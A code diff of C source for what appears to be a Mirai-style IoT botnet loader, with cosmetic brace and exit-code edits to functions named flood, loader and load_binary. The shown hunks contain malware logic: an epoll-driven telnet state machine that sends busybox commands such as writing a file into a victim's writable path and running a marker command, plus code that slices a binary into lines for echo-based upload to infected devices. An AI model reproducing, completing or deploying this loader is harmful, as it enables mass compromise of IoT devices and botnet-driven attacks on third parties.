@@ -352,7 +352,8 @@ void *flood(void *par1)
                 pthread_mutex_lock(&state->mutex);
                 closeAndCleanup(state->fd);
                 pthread_mutex_unlock(&state->mutex);
-            } else if(pevents[i].events & EPOLLIN)
+            }
+            else if(pevents[i].events & EPOLLIN)
             {
                 int is_closed = 0;
                 struct stateSlot_t *state = &stateTable[pevents[i].data.fd];
@@ -604,7 +605,8 @@ void *flood(void *par1)
                             sockprintf(state->fd, "/bin/busybox echo -ne '' > %s/a && /bin/busybox VDOSS\r\n", state->path[state->pathInd]);
                             state->state = 101;
                             break;
-                        } else if (matchPrompt(buf))
+                        }
+                        else if (matchPrompt(buf))
                         {
                             state->pathInd++;
                             if (state->pathInd == 5 || strlen(state->path[state->pathInd]) == 0)
@@ -715,7 +717,8 @@ void *flood(void *par1)
                     event.events = EPOLLIN | EPOLLRDHUP | EPOLLET | EPOLLONESHOT;
                     epoll_ctl(epollFD, EPOLL_CTL_MOD, state->fd, &event);
                 }
-            } else if(pevents[i].events & EPOLLOUT)
+            }
+            else if(pevents[i].events & EPOLLOUT)
             {   
                 struct stateSlot_t *state = &stateTable[pevents[i].data.fd];
                 
@@ -808,7 +811,7 @@ void *loader(void *threadCount)
             if((fd=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP))<0)
             {
                 perror("cant open socket");
-                exit(-1);
+                exit(1);
             }
             fcntl(fd, F_SETFL, fcntl(fd, F_GETFL, NULL) | O_NONBLOCK);
             int flag = 1; 
@@ -890,15 +893,17 @@ int load_binary(char *path)
     int fd, size = 0, got = 0, i, slice = 0;
     unsigned char ch;
     
-    if ((fd = open(path, O_RDONLY)) == -1)
+    if ((fd = open(path, O_RDONLY)) == -1) {
         return -1;
+    }
     while ((got = read(fd, &ch, 1)) > 0) size++;
     close(fd);
     
     binary.num_slices = ceil(size / (float)BYTES_PER_LINE);
     binary.slices = calloc(binary.num_slices, sizeof(unsigned char *));
-    if (binary.slices == NULL)
+    if (binary.slices == NULL) {
         return -1;
+    }
         
     for (i = 0; i < binary.num_slices; i++)
     {
@@ -907,8 +912,10 @@ int load_binary(char *path)
             return -1;
     }
     
-    if ((fd = open(path, O_RDONLY)) == -1)
+    if ((fd = open(path, O_RDONLY)) == -1) {
         return -1;
+    }
+    
     do
     {
         for (i = 0; i < BYTES_PER_LINE; i++)
@@ -943,8 +950,9 @@ int main(int argc, char *argv[ ])
     int threads = atoi(argv[5]);
     maxConnectedSockets = atoi(argv[6]);
     
-    if (argc == 8)
+    if (argc == 8) {
         debug_mode = 1;
+    }
     
     int i;
     for(i = 0; i < (1024 * 100); i++)
